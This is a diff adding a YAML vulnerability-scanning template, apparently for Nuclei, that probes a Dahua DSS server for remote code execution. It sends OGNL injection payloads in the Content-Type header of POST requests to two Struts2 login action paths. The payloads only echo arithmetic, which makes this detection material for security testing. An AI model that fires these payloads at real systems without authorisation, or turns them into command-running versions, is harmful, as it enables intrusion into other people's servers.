@@ -1,0 +1,31 @@
+id: yaml-poc-dahuatech-dss-rce-CT-646518
+
+info:
+  name: yaml-poc-dahuatech-dss-rce-CT-646518
+  author: haiqing.chen
+  severity: critical
+  tags: xray-converted,rce
+
+http:
+  - raw:
+      - |
+        POST /admin/login_login.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{rand_int(1000, 9999)}}+{{rand_int(1000, 9999)}})).(#o.close())}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /portal/login_init.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{rand_int(1000, 9999)}}*{{rand_int(1000, 9999)}})).(#o.close())}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
